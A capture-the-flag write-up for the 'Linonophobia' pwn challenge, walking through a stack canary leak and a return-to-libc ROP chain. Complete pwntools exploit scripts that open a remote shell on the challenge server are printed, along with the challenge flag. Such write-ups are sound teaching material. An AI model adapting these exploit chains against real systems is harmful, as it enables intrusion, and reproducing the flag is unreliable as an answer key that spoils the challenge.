# Linonophobia (Pwn, 200 pts)

## Description

im scared of format strings

## Attachments

[linonophobia](linonophobia)

## Solution

Checksec:

![image](https://user-images.githubusercontent.com/11196638/129359672-bffa2fa9-e0b0-42c9-bf52-7576f8a94aa2.png)

Ok, no PIE.

High level disassembly:

![image](https://user-images.githubusercontent.com/11196638/129359580-5b57277f-477b-4fa8-b014-79dbc8c81dae.png)

The code before the `read` overwrites `printf@GOT` with `puts@GOT`; makes sense, since `puts` does not take format strings like `printf`. But while format string attacks can't be done, `puts` writes until a `null` terminator; `read` reads to `[rbp-0x110]`, so we also know where the canary is - which means we can leak the canary! 

![image](https://user-images.githubusercontent.com/11196638/129360384-b0e9a14d-6e48-4f59-b4c0-d5a081782adc.png)

```py
from pwn import *

p = process('chal.imaginaryctf.org', 42006)
p.recvline()
p.sendline(b'a'*0x108)
p.recvuntil(b'a'*0x108+b'\n')
canary = u64(p.recv(7).rjust(8,b'\x00'))
print("canary=>" + hex(canary))
```
```
canary==>0x5fbf3807ff35e200
```

Luckily, we have another read that we can do, so we can use the canary to overwrite the return address. We can do a return to libc on this - to do so, we need to figure out which libc version is being used. We can use `puts` to leak the address of itself using the binary given. We want the addresses of `puts` to be printed by `puts`, so we need address of `puts@GOT` to be the first argument to `puts@PLT`. As such, we need `pop rdi; ret`. Then we should return back to the beginning to be able to exploit using `main` address.

```py
elf = ELF('./linonophobia')
r = ROP(elf)

PUTS_GOT = elf.got['puts']
PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']
POP_RDI = (r.find_gadget(['pop rdi', 'ret']))[0]

payload = b'a'*0x108 + p64(canary) + b'a'*8+ p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
p.sendline(payload)
puts_addr = u64(p.recvline().strip().ljust(8,b"\x00"))
print("puts_addr=>" + hex(puts_addr))
```
```
puts_addr=>0x7f07f87215a0
```

Good, we got the address of `puts`. Putting this address into [libc database search](libc.blukat.me), we get a few different versions:

![image](https://user-images.githubusercontent.com/11196638/129401151-76c326b3-0e19-4c7d-89fb-06450373999a.png)

I'm assuming it's going to be one of the `ubuntu` versions. There are three of them, we can try all of them and see if they work. `ubuntu9` didn't work; moving on to `ubuntu9.1`!

We'll use [`one_gadget`](https://github.com/david942j/one_gadget) to look for the shellcode:

![image](https://user-images.githubusercontent.com/11196638/129401491-b4593331-629e-485a-933f-86bd867ffcbc.png)

The first one turned out to be the best option, because the binary conveniently had the gadget `pop r12; pop r13; pop r14; pop r15; ret`. We can just put a bunch of `NULL` bytes on to the stack after that to initialize `r12` and `r15` to `NULL`. 

The offset from `one_gadget` is from the base of our `libc` file. We'll calculate the base address by simply subtracting the `puts` address in the `libc` file from the `puts` address that we have from our running process.

Final code:

```py
from pwn import *

libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so')
elf = ELF('./linonophobia')
r = ROP(elf)

PUTS_GOT = elf.got['puts']
PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']
POP_RDI = (r.find_gadget(['pop rdi', 'ret']))[0]
POP_R12_15 = (r.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret']))[0]
binsh = 0xe6c7e # from one_gadget; requires r12, r15 to be NULL

p = remote('chal.imaginaryctf.org', 42006)
p.recvline()
p.sendline(b'a'*0x108)
p.recvuntil(b'a'*0x108 + b'\n')
canary = u64(p.recv(7).rjust(8,b'\x00'))
print("canary=>" + hex(canary))
print(p.clean())

payload = b'a'*0x108 + p64(canary) + b'a'*8+ p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
p.sendline(payload)
puts_addr = u64(p.recvline().strip().ljust(8,b"\x00"))
print("puts_addr=>" + hex(puts_addr))
print(p.clean())

libc_base = puts_addr - libc.symbols['puts']
binsh = libc_base + binsh

payload = b'a'*0x108 + p64(canary) + b'a'*8 + p64(POP_R12_15) + b'\x00'*32 + p64(binsh)
print(payload)
p.send(payload)
p.recvline()

print("========shell========")
p.send(payload)
p.clean()
p.interactive()
```

## Flag
```
ictf{str1ngs_4r3_null_t3rm1n4t3d!_b421ba9f}
```

## Afterthought

I knew very abstractly of return-to-libc attack, but it was the first time actually doing one. Needless to say, although it took a lot of mistakes and debugging, it felt very satisfactory once I got it to work. Google FTW

## References & Notes

[heavily referenced guide to ret2libc #1](https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address)

[heavily referenced guide to ret2libc #2](https://www.programmersought.com/article/57675557942/)

[basic outline of ret2libc, both 32 and 64 bits](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc)

[linonophobia.py](linonophobia.py)
